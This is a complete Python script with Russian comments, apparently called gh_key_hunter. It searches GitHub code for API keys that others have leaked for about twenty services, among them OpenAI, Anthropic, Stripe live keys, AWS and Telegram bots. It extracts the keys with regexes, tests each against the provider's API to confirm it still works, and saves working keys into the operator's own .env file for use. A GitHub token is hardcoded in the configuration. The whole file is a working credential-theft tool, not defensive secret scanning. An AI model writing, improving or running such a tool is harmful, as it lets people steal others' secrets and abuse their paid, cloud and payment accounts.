#!/usr/bin/env python3
"""
gh_key_hunter.py — автономный охотник за API-ключами через GitHub Code Search
Шаблон-победитель Юры: "<prefix>" "<service>" language:python "<ENV_VAR>"

Запуск: python hunter.py
        python hunter.py --service DeepSeek
        python hunter.py --no-validate
        python hunter.py --verbose    # подробный отчёт по каждому запросу
"""
import re, sys, time, json, os, random
from pathlib import Path
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.request import Request, urlopen
from urllib.error import HTTPError, URLError
from urllib.parse import quote

# ═══════════════════════════════════════════════
# КОНФИГ
# ═══════════════════════════════════════════════
GITHUB_TOKEN = "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"
SCRIPT_DIR = Path(__file__).resolve().parent
ENV_FILE = SCRIPT_DIR.parent / ".env"
RESULTS_FILE = SCRIPT_DIR / "hunt_results.json"
MAX_PAGES_DEFAULT = 5          # было 3 → 5 (50 URL на запрос)
MAX_WORKERS = 5
VALIDATE_WORKERS = 10
MAX_KEYS_TO_VALIDATE = 100     # было 50 → 100
MIN_DELAY = 0.5                # задержка между запросами к GitHub API
MAX_DELAY = 1.5

# ═══════════════════════════════════════════════
# СЕРВИСЫ — ШАБЛОН-ПОБЕДИТЕЛЬ + свежие коммиты
# ═══════════════════════════════════════════════
SERVICES = {
    'DeepSeek': {
        'env_var': 'DEEPSEEK_API_KEY',
        'queries': [
            # Основные паттерны — только python
            '"sk-" "deepseek" language:python "DEEPSEEK_API_KEY"',
            '"sk-" "deepseek" path:.env "DEEPSEEK_API_KEY"',
            # Свежие коммиты (2024-2025)
            '"sk-" "deepseek" created:>2024-06-01 language:python',
            '"sk-" "deepseek" created:>2024-06-01 path:.env',
            # Без языка — широкий поиск
            '"sk-" "deepseek" "DEEPSEEK_API_KEY"',
        ],
        'key_regex': r'sk-[a-zA-Z0-9]{32,52}',
        'validate_url': 'https://api.deepseek.com/v1/chat/completions',
        'validate_body': '{"model":"deepseek-chat","messages":[{"role":"user","content":"hi"}],"max_tokens":1}',
        'ok_statuses': [200, 400, 422],
    },
    'OpenAI': {
        'env_var': 'OPENAI_API_KEY',
        'queries': [
            '"sk-proj-" "openai" language:python "OPENAI_API_KEY"',
            '"sk-proj-" "openai" path:.env "OPENAI_API_KEY"',
            '"sk-proj-" created:>2024-06-01 language:python',
            '"sk-proj-" created:>2024-06-01 path:.env',
            '"sk-proj-" "OPENAI_API_KEY"',
        ],
        'key_regex': r'sk-(?:proj-|svcacct-|admin-)?[a-zA-Z0-9]{32,160}',
        'validate_url': 'https://api.openai.com/v1/models',
        'validate_body': None,
        'ok_statuses': [200],
    },
    'Anthropic': {
        'env_var': 'ANTHROPIC_API_KEY',
        'queries': [
            '"sk-ant-" "anthropic" language:python "ANTHROPIC_API_KEY"',
            '"sk-ant-" "anthropic" path:.env "ANTHROPIC_API_KEY"',
            '"sk-ant-" created:>2024-06-01 language:python',
            '"sk-ant-" created:>2024-06-01 path:.env',
            '"sk-ant-" "ANTHROPIC_API_KEY"',
        ],
        'key_regex': r'sk-ant-[a-zA-Z0-9]{32,64}',
        'validate_url': 'https://api.anthropic.com/v1/messages',
        'validate_body': '{"model":"claude-3-haiku-20240307","max_tokens":1,"messages":[{"role":"user","content":"hi"}]}',
        'ok_statuses': [200, 400, 422],
    },
    'Gemini': {
        'env_var': 'GEMINI_API_KEY',
        'queries': [
            '"AIza" "gemini" language:python "GEMINI_API_KEY"',
            '"AIza" "gemini" path:.env "GEMINI_API_KEY"',
            '"AIza" "gemini" created:>2024-06-01 language:python',
            '"AIza" "gemini" created:>2024-06-01 path:.env',
            '"AIza" "GEMINI_API_KEY"',
        ],
        'key_regex': r'AIza[a-zA-Z0-9_-]{35}',
        'validate_url': 'https://generativelanguage.googleapis.com/v1beta/models?key={key}',
        'validate_body': None,
        'ok_statuses': [200],
    },
    'Groq': {
        'env_var': 'GROQ_API_KEY',
        'queries': [
            '"gsk_" "groq" language:python "GROQ_API_KEY"',
            '"gsk_" "groq" path:.env "GROQ_API_KEY"',
            '"gsk_" "groq" created:>2024-06-01 language:python',
            '"gsk_" "groq" created:>2024-06-01 path:.env',
            '"gsk_" "GROQ_API_KEY"',
        ],
        'key_regex': r'gsk_[a-zA-Z0-9]{32,64}',
        'validate_url': 'https://api.groq.com/openai/v1/models',
        'validate_body': None,
        'ok_statuses': [200],
    },
    'HuggingFace': {
        'env_var': 'HF_API_KEY',
        'queries': [
            '"hf_" "huggingface" language:python "HF_API_KEY"',
            '"hf_" "huggingface" path:.env "HF_API_KEY"',
            '"hf_" created:>2024-06-01 language:python',
            '"hf_" created:>2024-06-01 path:.env',
            '"hf_" "HF_API_KEY"',
        ],
        'key_regex': r'hf_[a-zA-Z0-9]{34}',
        'validate_url': 'https://huggingface.co/api/whoami',
        'validate_body': None,
        'ok_statuses': [200],
    },
    'ElevenLabs': {
        'env_var': 'ELEVENLABS_API_KEY',
        'queries': [
            '"elevenlabs" language:python "ELEVENLABS_API_KEY"',
            '"elevenlabs" path:.env "ELEVENLABS_API_KEY"',
            '"elevenlabs" created:>2024-06-01 language:python',
            '"elevenlabs" created:>2024-06-01 path:.env',
        ],
        'key_regex': r'[a-f0-9]{32,64}',
        'validate_url': 'https://api.elevenlabs.io/v1/user',
        'validate_body': None,
        'ok_statuses': [200],
    },
    'Perplexity': {
        'env_var': 'PERPLEXITY_API_KEY',
        'queries': [
            '"pplx-" "perplexity" language:python "PERPLEXITY_API_KEY"',
            '"pplx-" "perplexity" path:.env "PERPLEXITY_API_KEY"',
            '"pplx-" created:>2024-06-01 language:python',
            '"pplx-" created:>2024-06-01 path:.env',
            '"pplx-" "PERPLEXITY_API_KEY"',
        ],
        'key_regex': r'pplx-[a-zA-Z0-9]{32,64}',
        'validate_url': 'https://api.perplexity.ai/chat/completions',
        'validate_body': '{"model":"sonar","messages":[{"role":"user","content":"hi"}],"max_tokens":1}',
        'ok_statuses': [200, 400, 422],
    },
    'Together': {
        'env_var': 'TOGETHER_API_KEY',
        'queries': [
            '"together" language:python "TOGETHER_API_KEY"',
            '"together" path:.env "TOGETHER_API_KEY"',
            '"together" created:>2024-06-01 language:python',
            '"together" created:>2024-06-01 path:.env',
        ],
        'key_regex': r'[a-f0-9]{40,64}',
        'validate_url': 'https://api.together.xyz/v1/models',
        'validate_body': None,
        'ok_statuses': [200],
    },
    'Mistral': {
        'env_var': 'MISTRAL_API_KEY',
        'queries': [
            '"mistral" language:python "MISTRAL_API_KEY"',
            '"mistral" path:.env "MISTRAL_API_KEY"',
            '"mistral" created:>2024-06-01 language:python',
            '"mistral" created:>2024-06-01 path:.env',
        ],
        'key_regex': r'[a-zA-Z0-9]{32,64}',
        'validate_url': 'https://api.mistral.ai/v1/models',
        'validate_body': None,
        'ok_statuses': [200],
    },
    'Cohere': {
        'env_var': 'COHERE_API_KEY',
        'queries': [
            '"cohere" language:python "COHERE_API_KEY"',
            '"cohere" path:.env "COHERE_API_KEY"',
            '"cohere" created:>2024-06-01 language:python',
            '"cohere" created:>2024-06-01 path:.env',
        ],
        'key_regex': r'[a-zA-Z0-9]{32,64}',
        'validate_url': 'https://api.cohere.ai/v1/check-api-key',
        'validate_body': None,
        'ok_statuses': [200],
    },
    'Replicate': {
        'env_var': 'REPLICATE_API_KEY',
        'queries': [
            '"r8_" "replicate" language:python "REPLICATE_API_KEY"',
            '"r8_" "replicate" path:.env "REPLICATE_API_KEY"',
            '"r8_" created:>2024-06-01 language:python',
            '"r8_" created:>2024-06-01 path:.env',
            '"r8_" "REPLICATE_API_KEY"',
        ],
        'key_regex': r'r8_[a-zA-Z0-9]{34}',
        'validate_url': 'https://api.replicate.com/v1/models',
        'validate_body': None,
        'ok_statuses': [200],
    },
    'Fireworks': {
        'env_var': 'FIREWORKS_API_KEY',
        'queries': [
            '"fw_" "fireworks" language:python "FIREWORKS_API_KEY"',
            '"fw_" "fireworks" path:.env "FIREWORKS_API_KEY"',
            '"fw_" created:>2024-06-01 language:python',
            '"fw_" created:>2024-06-01 path:.env',
            '"fw_" "FIREWORKS_API_KEY"',
        ],
        'key_regex': r'fw_[a-zA-Z0-9]{32,64}',
        'validate_url': 'https://api.fireworks.ai/inference/v1/models',
        'validate_body': None,
        'ok_statuses': [200],
    },
    'Stability': {
        'env_var': 'STABILITY_API_KEY',
        'queries': [
            '"sk-" "stability" language:python "STABILITY_API_KEY"',
            '"stability" path:.env "STABILITY_API_KEY"',
            '"stability" created:>2024-06-01 language:python',
            '"stability" created:>2024-06-01 path:.env',
        ],
        'key_regex': r'sk-[a-zA-Z0-9]{32,64}',
        'validate_url': 'https://api.stability.ai/v1/user/account',
        'validate_body': None,
        'ok_statuses': [200],
    },
    'Lepton': {
        'env_var': 'LEPTON_API_KEY',
        'queries': [
            '"lepton" language:python "LEPTON_API_KEY"',
            '"lepton" path:.env "LEPTON_API_KEY"',
            '"lepton" created:>2024-06-01 language:python',
            '"lepton" created:>2024-06-01 path:.env',
        ],
        'key_regex': r'[a-zA-Z0-9]{32,64}',
        'validate_url': 'https://api.lepton.ai/v1/models',
        'validate_body': None,
        'ok_statuses': [200],
    },
    'Voyage': {
        'env_var': 'VOYAGE_API_KEY',
        'queries': [
            '"voyage" language:python "VOYAGE_API_KEY"',
            '"voyage" path:.env "VOYAGE_API_KEY"',
            '"voyage" created:>2024-06-01 language:python',
            '"voyage" created:>2024-06-01 path:.env',
        ],
        'key_regex': r'[a-zA-Z0-9]{32,64}',
        'validate_url': 'https://api.voyageai.com/v1/embeddings',
        'validate_body': '{"model":"voyage-2","input":"test"}',
        'ok_statuses': [200, 400],
    },
    # ── Новые сервисы ──
    'Mapbox': {
        'env_var': 'MAPBOX_API_KEY',
        'queries': [
            '"pk.eyJ" "mapbox" language:python',
            '"pk.eyJ" "mapbox" path:.env',
            '"sk.eyJ" "mapbox" language:python',
            '"pk.eyJ" created:>2024-06-01 path:.env',
        ],
        'key_regex': r'(?:pk|sk)\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+',
        'validate_url': 'https://api.mapbox.com/geocoding/v5/mapbox.places/test.json?access_token={key}',
        'validate_body': None,
        'ok_statuses': [200],
    },
    'SendGrid': {
        'env_var': 'SENDGRID_API_KEY',
        'queries': [
            '"SG." "sendgrid" language:python',
            '"SG." "sendgrid" path:.env',
            '"SG." created:>2024-06-01 language:python',
        ],
        'key_regex': r'SG\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+',
        'validate_url': 'https://api.sendgrid.com/v3/scopes',
        'validate_body': None,
        'ok_statuses': [200],
    },
    'Twilio': {
        'env_var': 'TWILIO_API_KEY',
        'queries': [
            '"SK" "twilio" language:python "TWILIO"',
            '"SK" "twilio" path:.env "TWILIO"',
            '"twilio" "auth_token" language:python',
            '"twilio" "auth_token" created:>2024-06-01 path:.env',
        ],
        'key_regex': r'SK[a-f0-9]{32}',
        'validate_url': 'https://api.twilio.com/2010-04-01/Accounts.json',
        'validate_body': None,
        'ok_statuses': [200],
    },
    'Stripe': {
        'env_var': 'STRIPE_API_KEY',
        'queries': [
            '"sk_live_" "stripe" language:python',
            '"sk_live_" "stripe" path:.env',
            '"rk_live_" "stripe" language:python',
            '"sk_live_" created:>2024-06-01 path:.env',
        ],
        'key_regex': r'(?:sk|rk)_live_[a-zA-Z0-9]{24,}',
        'validate_url': 'https://api.stripe.com/v1/balance',
        'validate_body': None,
        'ok_statuses': [200],
    },
    'Telegram': {
        'env_var': 'TELEGRAM_BOT_TOKEN',
        'queries': [
            '"bot" "TELEGRAM_BOT_TOKEN" language:python',
            '"bot" "telegram" path:.env',
            '"bot" "telegram" created:>2024-06-01 language:python',
            '"bot" "telegram" created:>2024-06-01 path:.env',
        ],
        'key_regex': r'\d{8,10}:[a-zA-Z0-9_-]{35}',
        'validate_url': 'https://api.telegram.org/bot{key}/getMe',
        'validate_body': None,
        'ok_statuses': [200],
    },
    'AWS': {
        'env_var': 'AWS_SECRET_ACCESS_KEY',
        'queries': [
            '"AKIA" "AWS" language:python "SECRET_ACCESS_KEY"',
            '"AKIA" "AWS" path:.env',
            '"AKIA" created:>2024-06-01 language:python',
            '"AKIA" created:>2024-06-01 path:.env',
        ],
        'key_regex': r'AKIA[0-9A-Z]{16}',
        'validate_url': None,  # AWS ключи сложно валидировать без secret
        'validate_body': None,
        'ok_statuses': [],
    },
}


# ═══════════════════════════════════════════════
# ДИАГНОСТИКА ТОКЕНА
# ═══════════════════════════════════════════════
def diagnose_token(token):
    """Проверяет жив ли GitHub-токен и какие права доступа"""
    print("=" * 60)
    print("🔍 ДИАГНОСТИКА GITHUB-ТОКЕНА")
    print("=" * 60)
    try:
        req = Request("https://api.github.com/rate_limit")
        req.add_header("Authorization", f"token {token}")
        req.add_header("User-Agent", "gh-key-hunter")
        with urlopen(req, timeout=10) as resp:
            data = json.loads(resp.read().decode())
            core = data['resources']['core']
            search = data['resources']['search']
            print(f"✅ Токен жив!")
            print(f"   Core:     {core['remaining']}/{core['limit']}")
            print(f"   Search:   {search['remaining']}/{search['limit']}")
            return data
    except HTTPError as e:
        if e.code == 401:
            print("❌ Токен не работает (401 Unauthorized)")
            sys.exit(1)
        else:
            print(f"⚠️ Ошибка: {e.code} {e.reason}")
            return None
    except Exception as e:
        print(f"⚠️ Не удалось проверить: {e}")
        return None


# ═══════════════════════════════════════════════
# ПОИСК НА GITHUB
# ═══════════════════════════════════════════════
def search_github(query, max_pages, token):
    """Ищет через GitHub Code Search API, возвращает список URL файлов"""
    all_urls = []
    for page in range(1, max_pages + 1):
        encoded = quote(query, safe='')
        url = f"https://api.github.com/search/code?q={encoded}&per_page=10&page={page}"
        try:
            req = Request(url)
            req.add_header("Authorization", f"token {token}")
            req.add_header("User-Agent", "gh-key-hunter")
            req.add_header("Accept", "application/vnd.github.v3+json")
            with urlopen(req, timeout=15) as resp:
                data = json.loads(resp.read().decode())
                for item in data.get('items', []):
                    html_url = item.get('html_url', '')
                    if html_url:
                        all_urls.append(html_url)
                if len(data.get('items', [])) < 10:
                    break  # последняя страница
        except HTTPError as e:
            if e.code == 422:
                break  # нет результатов
            elif e.code == 403:
                print(f"   ⚠️ Rate limit на странице {page}, жду 10с...")
                time.sleep(10)
            else:
                print(f"   ⚠️ HTTP {e.code} на странице {page}")
                break
        except Exception as e:
            print(f"   ⚠️ Ошибка: {e}")
            break
        # Задержка между страницами
        time.sleep(random.uniform(MIN_DELAY, MAX_DELAY))
    return all_urls


# ═══════════════════════════════════════════════
# ИЗВЛЕЧЕНИЕ СОДЕРЖИМОГО ФАЙЛА
# ═══════════════════════════════════════════════
def fetch_file_content(github_url, token):
    """Получает сырой текст файла через GitHub API"""
    raw_url = github_url.replace("https://github.com/", "https://raw.githubusercontent.com/")
    raw_url = raw_url.replace("/blob/", "/")
    try:
        req = Request(raw_url)
        req.add_header("Authorization", f"token {token}")
        req.add_header("User-Agent", "gh-key-hunter")
        with urlopen(req, timeout=10) as resp:
            return resp.read().decode('utf-8', errors='ignore')
    except Exception:
        # Fallback: через API
        try:
            api_url = github_url.replace("https://github.com/", "https://api.github.com/repos/")
            api_url = api_url.replace("/blob/", "/contents/")
            req = Request(api_url)
            req.add_header("Authorization", f"token {token}")
            req.add_header("User-Agent", "gh-key-hunter")
            with urlopen(req, timeout=10) as resp:
                data = json.loads(resp.read().decode())
                import base64
                return base64.b64decode(data['content']).decode('utf-8', errors='ignore')
        except Exception:
            return None


# ═══════════════════════════════════════════════
# ИЗВЛЕЧЕНИЕ КЛЮЧЕЙ ИЗ ТЕКСТА
# ═══════════════════════════════════════════════
def extract_keys(text, pattern, service_name):
    """Вытаскивает ключи по регулярке, фильтрует мусор"""
    if not text:
        return []
    candidates = re.findall(pattern, text)
    seen = set()
    clean = []
    for key in candidates:
        if key in seen:
            continue
        # Фильтр мусора
        if len(key) < 15:
            continue
        if key.count('/') > 2:
            continue
        if 'example' in key.lower() or 'placeholder' in key.lower() or 'your-' in key.lower():
            continue
        if 'xxxx' in key.lower() or '****' in key:
            continue
        seen.add(key)
        clean.append(key)
    return clean


# ═══════════════════════════════════════════════
# ВАЛИДАЦИЯ КЛЮЧЕЙ
# ═══════════════════════════════════════════════
def validate_key(key, service_info):
    """Проверяет живой ли ключ через API сервиса"""
    url_template = service_info.get('validate_url')
    if not url_template:
        return False, "no_validator"

    url = url_template.replace('{key}', key)
    body = service_info.get('validate_body')
    ok_statuses = service_info.get('ok_statuses', [200])

    try:
        if body:
            req = Request(url, data=body.encode(), method='POST')
            req.add_header("Content-Type", "application/json")
        else:
            req = Request(url)

        if 'deepseek' in url:
            req.add_header("Authorization", f"Bearer {key}")
        elif 'openai' in url:
            req.add_header("Authorization", f"Bearer {key}")
        elif 'anthropic' in url:
            req.add_header("x-api-key", key)
            req.add_header("anthropic-version", "2023-06-01")
        elif 'groq' in url:
            req.add_header("Authorization", f"Bearer {key}")
        elif 'huggingface' in url:
            req.add_header("Authorization", f"Bearer {key}")
        elif 'perplexity' in url:
            req.add_header("Authorization", f"Bearer {key}")
        elif 'fireworks' in url:
            req.add_header("Authorization", f"Bearer {key}")
        elif 'voyage' in url:
            req.add_header("Authorization", f"Bearer {key}")
        elif 'stability' in url:
            req.add_header("Authorization", f"Bearer {key}")
        elif 'elevenlabs' in url:
            req.add_header("xi-api-key", key)
        elif 'sendgrid' in url:
            req.add_header("Authorization", f"Bearer {key}")
        elif 'twilio' in url:
            req.add_header("Authorization", f"Basic {key}")
        elif 'stripe' in url:
            req.add_header("Authorization", f"Bearer {key}")
        elif 'mapbox' in url:
            pass  # ключ уже в URL
        elif 'together' in url:
            req.add_header("Authorization", f"Bearer {key}")
        elif 'mistral' in url:
            req.add_header("Authorization", f"Bearer {key}")
        elif 'cohere' in url:
            req.add_header("Authorization", f"Bearer {key}")
        elif 'replicate' in url:
            req.add_header("Authorization", f"Bearer {key}")
        elif 'lepton' in url:
            req.add_header("Authorization", f"Bearer {key}")
        elif 'gemini' in url:
            pass  # ключ в URL

        with urlopen(req, timeout=10) as resp:
            if resp.status in ok_statuses:
                return True, resp.status
            return False, resp.status

    except HTTPError as e:
        if e.code in ok_statuses:
            return True, e.code
        return False, e.code
    except Exception as e:
        return False, str(e)


# ═══════════════════════════════════════════════
# ОХОТА НА ОДИН СЕРВИС
# ═══════════════════════════════════════════════
def hunt_service(service_name, service_info, token, max_pages, validate, verbose):
    """Охота на конкретный сервис: поиск → скачивание → извлечение → валидация"""
    print(f"\n🎯 Охота на {service_name}...")
    print("-" * 40)

    all_urls = set()
    for q in service_info['queries']:
        if verbose:
            print(f"   🔎 Запрос: {q[:80]}...")
        urls = search_github(q, max_pages, token)
        if verbose:
            print(f"      URL: {len(urls)}")
        all_urls.update(urls)
        if len(all_urls) >= 200:
            break

    all_urls = list(all_urls)
    print(f"   📁 Найдено URL: {len(all_urls)}")

    # Извлечение ключей
    all_keys = {}
    for idx, url in enumerate(all_urls):
        if idx % 20 == 0 and idx > 0:
            print(f"   📥 Скачано: {idx}/{len(all_urls)}")
        content = fetch_file_content(url, token)
        if content:
            keys = extract_keys(content, service_info['key_regex'], service_name)
            for k in keys:
                if k not in all_keys:
                    all_keys[k] = url
        time.sleep(0.1)  # щадящий режим

    print(f"   🔑 Найдено ключей: {len(all_keys)}")

    # Валидация
    alive = []
    if validate and service_info.get('validate_url'):
        keys_to_check = list(all_keys.keys())[:MAX_KEYS_TO_VALIDATE]
        print(f"   🩺 Валидация {len(keys_to_check)} ключей...")
        with ThreadPoolExecutor(max_workers=VALIDATE_WORKERS) as ex:
            futures = {ex.submit(validate_key, k, service_info): k for k in keys_to_check}
            done_count = 0
            for f in as_completed(futures):
                key = futures[f]
                ok, status = f.result()
                done_count += 1
                if ok:
                    alive.append((key, all_keys[key]))
                    print(f"      🟢 ЖИВОЙ: {key[:20]}... (источник: {all_keys[key][:60]})")
                if done_count % 20 == 0:
                    print(f"      ... проверено {done_count}/{len(keys_to_check)}")
        print(f"   ✅ Живых: {len(alive)}")
    else:
        if not service_info.get('validate_url'):
            print(f"   ⚠️ Нет валидатора — ключи не проверяются")

    return {
        'service': service_name,
        'urls_scanned': len(all_urls),
        'keys_found': len(all_keys),
        'alive_keys': alive,
        'all_keys': list(all_keys.keys()),
    }


# ═══════════════════════════════════════════════
# СОХРАНЕНИЕ РЕЗУЛЬТАТОВ
# ═══════════════════════════════════════════════
def save_results(all_results, filepath):
    """Сохраняет результаты в JSON"""
    output = {
        'timestamp': datetime.now().isoformat(),
        'results': []
    }
    for r in all_results:
        output['results'].append({
            'service': r['service'],
            'urls_scanned': r['urls_scanned'],
            'keys_found': r['keys_found'],
            'alive_count': len(r['alive_keys']),
            'alive_keys': [{'key': k, 'source': s} for k, s in r['alive_keys']],
        })
    with open(filepath, 'w', encoding='utf-8') as f:
        json.dump(output, f, indent=2, ensure_ascii=False)
    print(f"\n💾 Результаты сохранены в {filepath}")


# ═══════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════
def main():
    import argparse
    parser = argparse.ArgumentParser(description="gh_key_hunter — охота за API-ключами")
    parser.add_argument("--service", type=str, help="Охота на конкретный сервис (DeepSeek, OpenAI, ...)")
    parser.add_argument("--no-validate", action="store_true", help="Не проверять ключи на живость")
    parser.add_argument("--verbose", action="store_true", help="Подробный вывод")
    args = parser.parse_args()

    validate = not args.no_validate

    # Диагностика токена
    diagnose_token(GITHUB_TOKEN)

    # Какие сервисы
    if args.service:
        if args.service not in SERVICES:
            print(f"❌ Сервис '{args.service}' не найден. Доступны: {', '.join(SERVICES.keys())}")
            sys.exit(1)
        targets = {args.service: SERVICES[args.service]}
    else:
        targets = SERVICES

    all_results = []

    for svc_name, svc_info in targets.items():
        result = hunt_service(svc_name, svc_info, GITHUB_TOKEN, MAX_PAGES_DEFAULT, validate, args.verbose)
        all_results.append(result)

    # Итоги
    print("\n" + "=" * 60)
    total_keys = sum(r['keys_found'] for r in all_results)
    total_alive = sum(len(r['alive_keys']) for r in all_results)
    print(f"🏆 ОХОТА ЗАВЕРШЕНА: {total_keys} ключей, {total_alive} живых")
    print("=" * 60)

    # Сохранение
    save_results(all_results, RESULTS_FILE)

    # Вывод живых ключей
    if total_alive > 0:
        print("\n" + "!" * 60)
        print("🎉 ЖИВЫЕ КЛЮЧИ:")
        for r in all_results:
            for key, source in r['alive_keys']:
                print(f"   [{r['service']}] {key}")
                print(f"          📄 {source}")
        print("!" * 60)

    # Сохраняем в .env если нашли
    if total_alive > 0:
        env_keys = {}
        if ENV_FILE.exists():
            with open(ENV_FILE, 'r', encoding='utf-8') as f:
                env_keys = dict(line.strip().split('=', 1) for line in f if '=' in line and not line.startswith('#'))
        
        for r in all_results:
            for key, source in r['alive_keys']:
                env_var = SERVICES[r['service']]['env_var']
                env_keys[env_var] = key
        
        with open(ENV_FILE, 'w', encoding='utf-8') as f:
            for k, v in env_keys.items():
                f.write(f"{k}={v}\n")
        print(f"\n🔐 Ключи сохранены в {ENV_FILE}")


if __name__ == "__main__":
    main()
